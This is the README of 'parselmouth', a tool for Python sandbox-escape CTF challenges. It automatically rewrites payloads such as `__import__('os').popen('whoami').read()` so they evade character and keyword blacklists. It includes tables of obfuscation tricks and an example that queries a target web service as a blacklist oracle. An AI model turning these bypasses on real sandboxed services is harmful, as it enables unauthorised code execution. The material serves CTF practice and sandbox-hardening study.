# parselmouth
一个自动化的 Python 沙箱逃逸 payload bypass 框架

English README: [README_EN.md](README_EN.md)

<img alt="image" src="https://github.com/Macr0phag3/parselmouth/blob/master/pic/cases.png">

<img alt="image" src="https://github.com/Macr0phag3/parselmouth/blob/master/pic/main.png">

## 1. 快速入门
- python 版本最好是 >= 3.10
- 安装依赖: `pip install -r requirements`

### 1.1 通过 CLI 使用
- 获取帮助信息：`python parselmouth.py -h`
- 指定 payload 与 rule: `python parselmouth.py  --payload "__import__('os').popen('whoami').read()" --rule "__" "." "'" '"' "read" "chr"`
  - 当然，很多时候规则字符比较多，所以你也可以考虑通过参数 `--re-rule` 来指定正则表达式格式的黑名单规则，例如 `--re-rule '[0-9]'` 等价于 `--rule "0" "1" "2" "3" "4" "5" "6" "7" "8" "9"`
  - 友情提示，通过 win 命令行使用，如果需要指定 `"`，则要用 `"\""`，如果用 `'"'` 会出现非预期情况（我大概知道是啥原因但是我懒得管 win :)
- 可以通过 `--specify-bypass` 指定 bypass function 的黑白名单；例如如果不希望 int 通过 unicode 字符的规范化进行 bypass，可以指定参数: `--specify-bypass '{"black": {"Bypass_Int": ["by_unicode"]}}'`
- `--shortest`：寻找最小的 exp
- `--minset`：寻找最小字符集的 exp
- 通过指定参数 `-v` 可以增加输出的信息；通过 `-vv` 可以输出 debug 信息，但通常是不需要的

在定制化 bypass 函数之后，如果想做测试，可以将测试的 payload、rule、answer 按照放在 `test_case.py` 里面，然后通过 `python run_test.py` 进行测试

### 1.2 通过 import 使用
```python
import parselmouth as p9h


p9h.BLACK_CHAR = {"kwd": [".", "'", '"']}
# p9h.BLACK_CHAR = {"re_kwd": "\.|'|\""}  # 或者这样
runner = p9h.P9H(
    "__import__('os').popen('whoami').read()",
    specify_bypass_map={"black": {"Bypass_Name": ["by_unicode"]}},
    min_len=False, versbose=0,
)
result = runner.visit()
status, c_result = p9h.color_check(result)
if status:
    print("bypass success")
    print("payload:", runner.source_code)
    print("exp:", result)
```

`p9h.P9H` 关键参数解释：
- `source_code`: 需要 bypass 的 payload
- `specify_bypass_map`: 指定 bypass function 的黑白名单；例如如果不希望变量名通过 unicode 字符的规范化进行 bypass，可以传参 `{"black": {"Bypass_Name": ["by_unicode"]}}`
- `min_len`: 寻找最小的 exp
- `versbose`: 输出的详细程度（`0` ~ `3`）
- `depth`: 通常情况下不需要使用这个参数；打印信息时所需要的缩进数量
- `bypass_history`: 通常情况下不需要使用这个参数；用于缓存 `可以 bypass` 和 `不可以 bypass` 的已知情况，值示例 `{"success": {}, "failed": []}`

### 1.3 定制化使用
**在定制化之前，最好先阅读下[这篇解释原理的文章](https://www.tr0y.wang/2024/03/04/parselmouth/)以及 `parselmouth.py`、`bypass_tools.py` 的主要代码**

方法一：参考文章 [传送门](https://www.tr0y.wang/2024/03/04/parselmouth/#%E5%AE%9A%E5%88%B6%E5%8C%96%E5%BC%80%E5%8F%91)

方法二：
- 要新增一个 ast 类型的识别与处理，需要在 `parselmouth.py` 中的 `P9H` 新增一个 `visit_` 方法
- 如果希望通过与目标交互的方式进行 payload 检查，可以改写 check 方法，原则是如果检查通过返回空 `[]`；如果检查不通过的话，最好是返回不通过的字符，如果条件有限，返回任意不为空的列表也可以
- 对已有的 ast 类型，需要新增不同的处理函数，则需要在 `bypass_tools.py` 中找到对应的 bypass 类型，并新增一个 `by_` 开头的方法。同一个类下的 bypass 函数，使用顺序取决于对应类中定义的顺序，先被定义的函数会优先尝试进行 bypass

#### 自定义 bypass 函数
以字符串 bypass 为例。假设希望将 `macr0phag3` 转为 base64 解码语句 `__import__('base64').b64decode(b'bWFjcjBwaGFnMw==')`，则可以给 `bypass_tools.py` 的 `Bypass_String` 动态挂一个新的 `by_` 方法：

```python
import base64

import parselmouth as p9h
import bypass_tools


@bypass_tools.recursion_protect
def by_base64(self):
    encoded = base64.b64encode(self.node._value.encode())
    return self.P9H(
        f'__import__("base64").b64decode({encoded!r})'
    ).visit()


bypass_tools.Bypass_String.by_base64 = by_base64
bypass_tools.Bypass_String.by_base64.__qualname__ = "Bypass_String.by_base64"

p9h.BLACK_CHAR = {"kwd": ["mac", "::", "by_char", "bytes", "chr", "dict"]}
runner = p9h.P9H(
    "'macr0phag3'",
    specify_bypass_map={"white": {"Bypass_String": ["by_base64"]}},
    versbose=2,
)
result = runner.visit()
status, c_result = p9h.color_check(result)
print(status, c_result, result)
```

如果希望覆盖自带的 bypass，也可以直接用同样的赋值方式替换已有方法：

```python
bypass_tools.Bypass_String.by_char = by_base64
bypass_tools.Bypass_String.by_char.__qualname__ = "Bypass_String.by_char"
```

定制完 bypass 之后，如果想补测试，可以把 payload、rule、answer 按 `test_case.py` 里现有的格式加进去，再跑：

```bash
python run_test.py
```

#### 自定义检查函数
默认的 `check` 只是本地检查 payload 是否命中黑名单：

```python
def check(payload, ignore_space=False):
    if isinstance(payload, ast.AST):
        payload = ast.unparse(payload)

    return [i for i in BLACK_CHAR if i in str(payload)]
```

但在真实场景里，payload 往往需要通过网络请求去验证。比如目标是一个 web 应用，此时可以直接改写全局的 `p9h.check`，把目标服务当成 oracle：

```python
import ast
import time

import requests

import parselmouth as p9h


def check(payload, ignore_space=False):
    if isinstance(payload, ast.AST):
        payload = ast.unparse(payload)

    result = requests.post(
        "http://127.0.0.1:5000/challenge",
        json={"exp": payload},
        timeout=5,
    ).text
    time.sleep(0.1)  # 防止过快导致 DoS
    if "hacker" in result:
        return [result]
    return []


p9h.check = check
runner = p9h.P9H("__import__('os').popen('whoami').read()", versbose=2)
result = runner.visit()
status, c_result = p9h.color_check(result)
print(status, c_result, result)
```

这个 `check` 需要遵守一个简单约定：
- 检查通过时返回空列表 `[]`
- 检查不通过时返回非空列表；最好把命中的关键字放进去，如果实在拿不到，返回任意非空列表也可以

下面给一个最小的 flask 测试服务例子：

```python
from flask import Flask, jsonify, request

app = Flask(__name__)


@app.route("/challenge", methods=["POST"])
def check_exp():
    data = request.json
    exp = str(data.get("exp"))

    if exp is None:
        return jsonify({"error": "Missing 'exp' parameter"}), 400

    forbidden_chars = ["'", '"', ".", "popen"]
    for char in forbidden_chars:
        if char in exp:
            return jsonify({"error": "hacker!"}), 400

    return jsonify({"message": "Expression is valid"}), 200


if __name__ == "__main__":
    app.run(debug=True)
```


## 2. 当前 bypass function

目前支持：

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Int    | by_trans | `0` | `len(())` | |
| Bypass_Int    | by_bin   | `10` | `0b1010` |将数字转为二进制 |
| Bypass_Int    | by_hex   | `10` | `0xa`    |将数字转为十六进制 |
| Bypass_Int    | by_cal   | `10` | `5*2`    |将数字转为算式 |
| Bypass_Int    | by_unicode   | `10` | `int('𝟣𝟢')`    | int + unicode 绕过|
| Bypass_Int    | by_ord   | `10` | `ord('\n')`    | ord 绕过|

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_String    | by_empty_str   | `""` | `str()`  | 构造空字符串 |
| Bypass_String    | by_quote_trans   | `"macr0phag3"` | `'macr0phag3'`  | 单双引号互相替换 |
| Bypass_String    | by_reverse   | `"macr0phag3"` | `"3gahp0rcam"[::-1]`    | 字符串逆序绕过|
| Bypass_String    | by_char   | `"macr0phag3"` |  `(chr(109) + chr(97) + chr(99) + chr(114) + chr(48) + chr(112) + chr(104) + chr(97) + chr(103) + chr(51))`   | char 绕过字符限制|
| Bypass_String    | by_dict   | `"macr0phag3"` | `list(dict(amacr0phag3=()))[0][1:]`  | dict 绕过限制|
| Bypass_String    | by_bytes_single   | `"macr0phag3"` | `str(bytes([109]))[2] + str(bytes([97]))[2] + str(bytes([99]))[2] + str(bytes([114]))[2] + str(bytes([48]))[2] + str(bytes([112]))[2] + str(bytes([104]))[2] + str(bytes([97]))[2] + str(bytes([103]))[2] + str(bytes([51]))[2]`  | bytes 绕过限制|
| Bypass_String    | by_bytes_full   | `"macr0phag3"` | `bytes([109, 97, 99, 114, 48, 112, 104, 97, 103, 51]).decode()`  | bytes 绕过限制 2 |
| Bypass_String    | by_format   | `"macr0phag3"` | `'{}{}{}{}{}{}{}{}{}{}'.format(chr(109), chr(97), chr(99), chr(114), chr(48), chr(112), chr(104), chr(97), chr(103), chr(51))`  | format 绕过限制 |
| Bypass_String    | by_hex_encode   | `"macr0phag3"` | `"\x6d\x61\x63\x72\x30\x70\x68\x61\x67\x33"`  | hex 编码绕过限制 |
| Bypass_String    | by_unicode_encode   | `"macr0phag3"` | `"\u006d\u0061\u0063\u0072\u0030\u0070\u0068\u0061\u0067\u0033"`  | unicode 编码绕过限制 |
| Bypass_String    | by_char_format   | `"macr0phag3"` | `"%c%c%c%c%c%c%c%c%c%c%c%c" % (95,95,98,117,105,108,116,105,110,115,95,95)`  | %c format 编码绕过限制，[@chi111i](https://github.com/chi111i) |
| Bypass_String    | by_char_add   | `"macr0phag3"` | `'m'+'a'+'c'+'r'+'0'+'p'+'h'+'a'+'g'+'3'`  | 字符加法运算绕过限制，[@chi111i](https://github.com/chi111i) |

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Name    | by_unicode   | `__import__` | `_＿import_＿` | unicode 绕过|
| Bypass_Name    | by_builtins_attr   | `__import__` | `__builtins__.__import__` | 从模块形态的 `__builtins__` 获取 name |
| Bypass_Name    | by_builtins_item   | `__import__` | `__builtins__['__import__']` | 从字典形态的 `__builtins__` 获取 name |
| Bypass_Name    | by_builtin_func_self   | `__import__` | `id.__self__.__import__` | 通过任意 `builtin_function_or_method.__self__` 拿到 builtins，自动选择可用入口 |
| Bypass_Name    | by_frame   | `__import__` | `(i for i in ()).gi_frame.f_builtins['__import__']` | 通过生成器 frame 的 `f_builtins` 获取 name |

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_String  | by_doc_index | `'system'` | `help.__doc__[...]+...` | 从可用 builtin 的 `__doc__` 文本中切字符拼字符串 |
| Bypass_Attribute    | by_getattr   | `str.find` | `getattr(str, 'find')` | getattr 绕过，相关思路参考 [@chi111i](https://github.com/chi111i) |
| Bypass_Attribute    | by_vars   | `str.find` | `vars(str)["find"]` | vars 绕过|
| Bypass_Attribute    | by_dict_attr   | `str.find` | `str.__dict__["find"]` | `__dict__` 绕过|

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Call    | by_builtin_func_self / by_getattr / by_vars ...   | `__import__('os')` / `os.system(1)` | `id.__self__.__import__('os')` / `vars(os)['system'](1)` | 动态包装被调用对象对应的 bypass，再统一交给 `try_bypass` 选择 |

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Keyword    | by_unicode   | `str(object=1)` | `str(ᵒbject=1)` | unicode 绕过|

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_BoolOp    | by_bitwise   | `'yes' if 1 and (2 or 3) or 2 and 3 else 'no'` | `'yes' if 1&(2\|3)\|2&3 else 'no'` | `and/or` 替换成 `&\|`，[@chi111i](https://github.com/chi111i) |
| Bypass_BoolOp    | by_arithmetic   | `'yes' if (__import__ and (2 or 3)) or (2 and 3) else 'no'` | `'yes' if bool(bool(__imp𝒐rt__)*bool(bool(2)+bool(3)))+bool(bool(2)*bool(3)) else 'no'` | `and/or` 替换成基础运算，[@chi111i](https://github.com/chi111i) |


以及上述所有方法的组合 bypass。

如果在使用的过程中发现有比较好用的 bypass 手法，或者任何问题都可以提交 issue :D

以及不论通过或没通过这个工具解开题目，都欢迎提交 issue 帮忙补充案例，我会统一放在 `challenges` 中供大家学习使用，多谢啦

## 3. TODO

- [ ] `exec`、`eval` + `open` 执行库代码
- [ ] `'__buil''tins__'` -> `str.__add__('__buil', 'tins__')`
- [ ] `__import__` -> `__loader__().load_module`
- [ ] `",".join("123")` -> `"".__class__.join(",", "123")`
- [ ] `",".join("123")` -> `str.join(",", "123")`
- [ ] `"123"[0]` -> `"123".__getitem__(0)`
- [ ] `"0123456789"` -> `sorted(set(str(hash(()))))`
- [ ] `[1, 2, 3][0]` -> `[1, 2, 3].__getitem__()`
- [ ] `2024` -> `next(reversed(range(2025)))`
- [ ] `{"a": 1}["a"]` -> `{"a": 1}.pop("a")`
- [ ] `1` -> `int(max(max(dict(a၁=()))))`
- [ ] `[i for i in range(10) if i == 5]` -> `[[i][0]for(i)in(range(10))if(i)==5]`
- [ ] `==` -> `in`
- [ ] 必要的空格 -> `\t`/...
- [ ] ~~`True or False` -> `bool(- (True) - (False))`~~ 感觉不实用
- [ ] `[2, 20, 30]` -> `[i for i in range(31) for j in range(31) if i==0 and j == 2 or i == 1 and j ==20 or i == 2 and j == 30]`

## 4. Others
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" width="400">

[![Stargazers over time](https://starchart.cc/Macr0phag3/parselmouth.svg)](https://starchart.cc/Macr0phag3/parselmouth)
